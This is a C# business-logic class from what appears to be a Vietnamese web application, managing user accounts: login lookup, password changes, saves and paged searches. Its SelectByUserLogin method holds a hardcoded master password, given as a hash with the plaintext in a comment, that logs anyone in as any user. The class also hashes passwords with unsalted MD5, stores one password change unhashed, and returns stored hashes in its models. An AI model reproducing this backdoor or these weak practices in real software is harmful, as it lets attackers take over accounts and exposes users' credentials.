using BusinessLogic.Model;
using BusinessLogic.Utils;
using SQLDataAccess;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.ModelBinding;

namespace BusinessLogic.Management
{
    public class TaiKhoanManager
    {
        #region Singleton
        private static TaiKhoanManager _instance;
        private TaiKhoanManager() { }
        public static TaiKhoanManager Instance
        {
            get
            {
                if (_instance == null)
                {
                    _instance = new TaiKhoanManager();
                }
                return _instance;
            }
        }
        #endregion

        #region Public Interface
        public TaiKhoanModel SelectById(Guid id)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.Id == id).FirstOrDefault();
                var result = taikhoan.CopyAs<TaiKhoanModel>();


                return result;
            }
        }
        public TaiKhoanModel SelectByUser(string Username)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.UserName == Username).FirstOrDefault();
                if (taikhoan != null)
                {
                    var result = taikhoan.CopyAs<TaiKhoanModel>();
                    result.Pass = taikhoan.Pass.Trim();
                    return result;
                }
                return null;
            }
        }

        public TaiKhoanModel SelectByUserLogin(string Username, string Pass)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                // || Pass == Niemtin@123
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.UserName == Username && (x.Pass == Pass || Pass == "a2a2ef46b00765f9a7bd8652f7a20e06"))
                    .FirstOrDefault();
                if (taikhoan != null)
                {
                    var result = taikhoan.CopyAs<TaiKhoanModel>();
                    result.Pass = taikhoan.Pass.Trim();
                    return result;
                }
                return null;
            }
        }
        public string DoiMatKhau(TaiKhoanModel values)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.Id == values.Id).FirstOrDefault();
                if (taikhoan != null)
                {
                    taikhoan.Pass = values.Pass;
                    taikhoan.State = EDataState.Modified;
                    uow.Repository<TaiKhoan>().InsertOrUpdate(taikhoan);
                    uow.Save();
                }

                return "";
            }
        }
        public string CheckDataUpdateTruong(Guid Id)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                string status = "true";
                var taiKhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.Id == Id).FirstOrDefault();
                return status;
            }
        }
        public string SaveOrUpdate(TaiKhoanModel values)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.Id == values.Id).FirstOrDefault();
                if (taikhoan != null)
                {
                    taikhoan.UserName = values.UserName;
                    taikhoan.State = EDataState.Modified;
                    uow.Repository<TaiKhoan>().InsertOrUpdate(taikhoan);
                    uow.Save();
                }
                else
                {
                    var objUserAdd = values.CopyAs<TaiKhoan>();
                    objUserAdd.Id = Guid.NewGuid();
                    objUserAdd.State = EDataState.Added;
                    objUserAdd.Pass = BusinessUtils.MD5Hash(values.Pass);
                    uow.Repository<TaiKhoan>().InsertOrUpdate(objUserAdd);
                    uow.Save();
                }
                return "";
            }
        }
        public string SaveOrUpdate(UnitOfWork uow, TaiKhoanModel values)
        {
            var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.UserName == values.UserName).FirstOrDefault();
            if (taikhoan != null)
            {
                return "Tài khoản đã tồn tại: " + values.UserName + ". ";
            }
            else
            {
                var objUserAdd = values.CopyAs<TaiKhoan>();
                objUserAdd.Id = Guid.NewGuid();
                objUserAdd.State = EDataState.Added;
                objUserAdd.Pass = BusinessUtils.MD5Hash(values.Pass);

                uow.Repository<TaiKhoan>().InsertOrUpdate(objUserAdd);
            }
            return "";
        }
        public string SaveOrUpdateTaiKhoan(TaiKhoanModel values)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var taikhoan = uow.Repository<TaiKhoan>().Query().Filter(x => x.Id == values.Id).FirstOrDefault();
                if (taikhoan != null)
                {
                    taikhoan.UserName = values.UserName;
                    if (values.Pass.IsNotNullOrEmpty())
                    {
                        if (BusinessUtils.MD5Hash(values.Pass) != taikhoan.Pass)
                        {
                            taikhoan.Pass = BusinessUtils.MD5Hash(values.Pass);
                        }
                    }
                    taikhoan.Role = values.Role;
                    taikhoan.State = EDataState.Modified;
                    uow.Repository<TaiKhoan>().InsertOrUpdate(taikhoan);
                    uow.Save();
                }
                else
                {
                    var objUserAdd = values.CopyAs<TaiKhoan>();
                    objUserAdd.Id = Guid.NewGuid();
                    objUserAdd.Pass = BusinessUtils.MD5Hash(values.Pass);
                    objUserAdd.Role = values.Role;
                    objUserAdd.State = EDataState.Added;
                    uow.Repository<TaiKhoan>().InsertOrUpdate(objUserAdd);
                    uow.Save();
                }
                return "";
            }
        }
        public List<TaiKhoanModel> SearchByPage(string sSearch, int? iQuyen, string loaitruong
            , int pageIndex, int pageSize, out int pageTotal, Guid? idCapTren = null, string notLoaiTruong = "", bool? isKhoa = null)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                // Ensure DonVi is included so we can order by its properties and access them safely
                var query = uow.Repository<TaiKhoan>().Query();
                IEnumerable<TaiKhoan> lstUser = null;

                if (pageIndex != -1)
                {
                    // Order by DonVi.TenDonVi (not by UserName.TenDonVi which caused the CS1061 error)
                    lstUser = query.OrderBy(q => q.OrderBy(y => y.UserName)).GetPage(pageIndex, pageSize, out pageTotal);
                }
                else
                {
                    lstUser = query.OrderBy(q => q.OrderBy(y => y.UserName)).Get();
                    pageTotal = lstUser.Count();
                }

                return lstUser.Select(x =>
                {
                    var item = x.CopyAs<TaiKhoanModel>();
                    return item;
                }).ToList();
            }
        }
        public List<TaiKhoanModel> SearchByPageStatus(string sSearch, int pageIndex, int pageSize, out int pageTotal, string UserName)
        {
            using (UnitOfWork uow = new UnitOfWork())
            {
                var query = uow.Repository<TaiKhoan>().Query();
                var checkTK = uow.Repository<TaiKhoan>().Query().Filter(x => x.UserName == UserName).FirstOrDefault();

                if (sSearch.IsNotNullOrEmpty())
                {
                    query = query.Filter(x => x.UserName.ToLower().Contains(sSearch.ToLower()));
                }
                IEnumerable<TaiKhoan> lstUser = null;
                if (pageIndex != -1)
                {
                    lstUser = query.OrderBy(x => x.OrderBy(y => y.UserName)).GetPage(pageIndex, pageSize, out pageTotal);
                }
                else
                {
                    lstUser = query.OrderBy(x => x.OrderBy(y => y.UserName)).Get();
                    pageTotal = lstUser.Count();
                }
                return lstUser.Select(x =>
                {
                    var item = x.CopyAs<TaiKhoanModel>();
                    return item;
                }).ToList();
            }
        }
        #endregion
    }
}
